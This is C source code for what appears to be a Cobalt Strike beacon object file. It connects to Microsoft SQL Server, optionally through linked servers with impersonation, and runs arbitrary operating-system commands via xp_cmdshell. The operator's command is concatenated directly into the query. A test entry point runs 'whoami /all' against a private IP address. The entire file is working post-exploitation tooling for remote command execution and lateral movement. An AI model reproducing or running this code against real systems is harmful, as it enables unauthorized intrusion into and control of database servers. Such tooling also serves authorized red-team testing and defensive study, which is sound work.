#include <windows.h>
#include "bofdefs.h"
#include "base.c"
#include "sql.c"


void ExecuteXpCmd(char* server, char* database, char* link, char* impersonate, char* command)
{
    SQLHENV env			 = NULL;
    SQLHSTMT stmt 		 = NULL;
	SQLHDBC dbc 		 = NULL;
	unsigned int timeout = 10;


    if (link == NULL)
	{
		dbc = ConnectToSqlServer(&env, server, database);
	}
	else
	{
		dbc = ConnectToSqlServer(&env, server, NULL);
	}

    if (dbc == NULL) {
		goto END;
	}

	//
	// allocate statement handle
	//
	ODBC32$SQLAllocHandle(SQL_HANDLE_STMT, dbc, &stmt);

	//
	// don't want to hang beacons forever, so we'll try to set a timeout
	//
	ODBC32$SQLSetStmtAttr(stmt, SQL_ATTR_QUERY_TIMEOUT, (SQLPOINTER)(uintptr_t)timeout, 0);

	internal_printf("[*] Executing system command...\n\n");

	if (link == NULL)
	{
		char* prefix = "EXEC xp_cmdshell '";
		char* suffix = "';";
		char* query = (char*)intAlloc(MSVCRT$strlen(prefix) + MSVCRT$strlen(command) + MSVCRT$strlen(suffix) + 1);

		MSVCRT$strcpy(query, prefix);
		MSVCRT$strcat(query, command);
		MSVCRT$strcat(query, suffix);

		//
		// In case we're taking a hanging action, print current output
		//
		printoutput(FALSE);

		//
		// Run the query
		//
		if (!HandleQuery(stmt, (SQLCHAR*)query, link, impersonate, FALSE)){
			goto END;
		}
		PrintQueryResults(stmt, TRUE);
	}
	else
	{	
		char* prefix = "SELECT 1; EXEC master..xp_cmdshell '";
		char* suffix = "';";
		char* query = (char*)intAlloc(MSVCRT$strlen(prefix) + MSVCRT$strlen(command) + MSVCRT$strlen(suffix) + 1);

		MSVCRT$strcpy(query, prefix);
		MSVCRT$strcat(query, command);
		MSVCRT$strcat(query, suffix);

		//
		// In case we're taking a hanging action, print current output
		//
		printoutput(FALSE);

		//
		// Run the query
		//
		if (!HandleQuery(stmt, (SQLCHAR*)query, link, impersonate, TRUE)){
			goto END;
		}

		internal_printf("[*] Command executed (Output not returned for linked server cmd execution)\n");
	}

	//
	// close the cursor
	//
	ODBC32$SQLCloseCursor(stmt);

END:
	DisconnectSqlServer(env, dbc, stmt);
}


#ifdef BOF
VOID go( 
	IN PCHAR Buffer, 
	IN ULONG Length 
) 
{
	char* server;
	char* database;
	char* link;
	char* impersonate;
	char* command;

	//
	// parse beacon args 
	//
	datap parser;
	BeaconDataParse(&parser, Buffer, Length);
	
	server	 	= BeaconDataExtract(&parser, NULL);
	database 	= BeaconDataExtract(&parser, NULL);
	link 		= BeaconDataExtract(&parser, NULL);
	impersonate = BeaconDataExtract(&parser, NULL);
	command 	= BeaconDataExtract(&parser, NULL);

	server = *server == 0 ? "localhost" : server;
	database = *database == 0 ? "master" : database;
	link = *link  == 0 ? NULL : link;
	impersonate = *impersonate == 0 ?  NULL : impersonate;

	if(!bofstart())
	{
		return;
	}

	if (UsingLinkAndImpersonate(link, impersonate))
	{
		return;
	}
	
	ExecuteXpCmd(server, database, link, impersonate, command);

	printoutput(TRUE);
};

#else

int main()
{
	ExecuteXpCmd("192.168.0.215", "master", NULL, NULL, "whoami /all");
}

#endif
